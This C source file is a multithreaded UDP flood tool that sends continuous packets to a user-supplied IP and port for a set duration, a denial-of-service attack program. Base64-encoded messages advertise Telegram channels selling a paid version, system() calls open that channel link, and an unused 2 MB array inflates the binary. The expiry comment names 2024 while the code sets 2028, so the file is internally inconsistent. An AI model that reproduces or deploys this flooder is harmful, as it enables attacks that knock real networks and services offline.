#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <ctype.h>

#define BUFFER_SIZE 8000

// Global variables to be used by threads
char *ip;
int port;
int duration;

// Large unused array to increase binary size
char padding_data[2 * 1024 * 1024];  // 2 MB

// Base64 encoding function
void base64_encode(const unsigned char *data, char *encoded, size_t length) {
    const char *base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int i = 0, j = 0, in_ = 0;
    unsigned char char_array_3[3], char_array_4[4];

    while (length--) {
        char_array_3[i++] = *(data++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; (i < 4); i++) {
                encoded[j++] = base64_chars[char_array_4[i]];
            }
            i = 0;
        }
    }

    if (i) {
        for (int k = i; k < 3; k++) {
            char_array_3[k] = '\0';
        }

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;

        for (int k = 0; (k < i + 1); k++) {
            encoded[j++] = base64_chars[char_array_4[k]];
        }

        while ((i++ < 3)) {
            encoded[j++] = '=';
        }
    }
    encoded[j] = '\0';
}

// Base64 decoding function
void base64_decode(const char *encoded, char *decoded) {
    const char *base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int i = 0, j = 0, in_len = strlen(encoded);
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];

    while (in_len-- && (encoded[in_] != '=') && (isalnum(encoded[in_]) || (encoded[in_] == '+') || (encoded[in_] == '/'))) {
        char_array_4[i++] = encoded[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++) {
                char_array_4[i] = strchr(base64_chars, char_array_4[i]) - base64_chars;
            }
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; i < 3; i++) {
                decoded[j++] = char_array_3[i];
            }
            i = 0;
        }
    }

    if (i) {
        for (int k = i; k < 4; k++) {
            char_array_4[k] = 0;
        }

        for (int k = 0; k < 4; k++) {
            char_array_4[k] = strchr(base64_chars, char_array_4[k]) - base64_chars;
        }

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (int k = 0; k < (i - 1); k++) {
            decoded[j++] = char_array_3[k];
        }
    }
    decoded[j] = '\0';
}

// Function to check expiration date
int is_expired() {
    struct tm expiry_date = {0};
    time_t now;
    double seconds;

    // Set the expiration date to August 13, 2024
    expiry_date.tm_year = 2028 - 1900;  // Years since 1900
    expiry_date.tm_mon = 7;            // Months since January (0-based)
    expiry_date.tm_mday = 13;          // Day of the month

    time(&now);
    seconds = difftime(mktime(&expiry_date), now);

    return seconds < 0;
}

// Function to attempt to open a URL based on available tools
void open_url(const char *url) {
    // Try various methods to open a URL
    if (system("command -v xdg-open > /dev/null") == 0) {
        system("xdg-open https://t.me/SOULCRACKS");
    } else if (system("command -v gnome-open > /dev/null") == 0) {
        system("gnome-open https://t.me/SOULCRACKS");
    } else if (system("command -v open > /dev/null") == 0) {
        system("open https://t.me/SOULCRACKS");
    } else if (system("command -v start > /dev/null") == 0) {
        system("start https://t.me/SOULCRACKS");
    } else {
        fprintf(stderr, "My channel link https://t.me/SOULCRACKS\n");
    }
}

// Function to send UDP traffic
void *send_udp_traffic(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    int sent_bytes;

    // Create a socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Set up the server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid address/ Address not supported");
        close(sock);
        pthread_exit(NULL);
    }

    // Prepare the message to send
    snprintf(buffer, sizeof(buffer), "UDP traffic test");

    // Calculate the end time
    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;

    while (time(NULL) < end_time) {
        sent_bytes = sendto(sock, buffer, strlen(buffer), 0,
                            (struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent_bytes < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    // Check expiration date
    if (is_expired()) {
        // Base64 encoded error message
        const char *encoded_error_message = "VGhpcyBmaWxlIGlzIGNsb3NlZCBAVklQTU9EU1hBRE1JTgpUaGlzIGlzIGZyZWUgdmVyc2lvbgpETSB0byBidXkKQFZJUE1PRFNYQURNSU4=";
        char decoded_error_message[512];
        base64_decode(encoded_error_message, decoded_error_message);
        fprintf(stderr, "Error: %s\n", decoded_error_message);
        open_url("https://t.me/SOULCRACKS");
        exit(EXIT_FAILURE);
    }

    // Initialize global variables
    ip = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    // Base64 encoded watermark message
    const char *encoded_watermark = "QHRlbGVncmFtIGNoYW5uZWwgQFNPVUxDUkFDS1MgVklQTU9EU1hBRE1JTiBUZXJtcyBvZiBzZXJ2aWNlIHVzZSBhbmQgbGVnYWwgY29uc2lkZXJhdGlvbnMu";
    char decoded_watermark[256];

    // Decode and print the watermark
    base64_decode(encoded_watermark, decoded_watermark);
    printf("Watermark: %s\n", decoded_watermark);

    // Initialize the padding data to ensure it is not optimized away
    memset(padding_data, 0, sizeof(padding_data));

    pthread_t tid[threads];
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&tid[i], NULL, send_udp_traffic, NULL) != 0) {
            perror("Thread creation failed");
            exit(EXIT_FAILURE);
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }

    return 0;
}
